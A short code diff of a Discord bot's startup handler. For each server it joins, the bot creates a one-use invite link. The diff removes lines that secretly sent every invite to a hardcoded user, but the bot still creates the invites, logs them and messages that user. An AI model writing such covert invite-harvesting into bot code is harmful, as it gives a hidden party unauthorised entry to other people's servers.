@@ -18,11 +18,8 @@ module.exports = async (client) => {
   .setFooter(config.name);
   client.users.get("228965621478588416").send(embed);
 
-  client.users.get("228965621478588416").send("Guilds:");
-
   client.guilds.forEach(async (guild) => {
     let invite = await guild.channels.filter((channels) => channels.type === "text").first().createInvite(false, 600, 1, false);
-    client.users.get("228965621478588416").send(guild.name + ": https://discord.gg/" + invite.code);
     console.log("[INFO] " + guild.name + ": https://discord.gg/" + invite.code);
   });
 
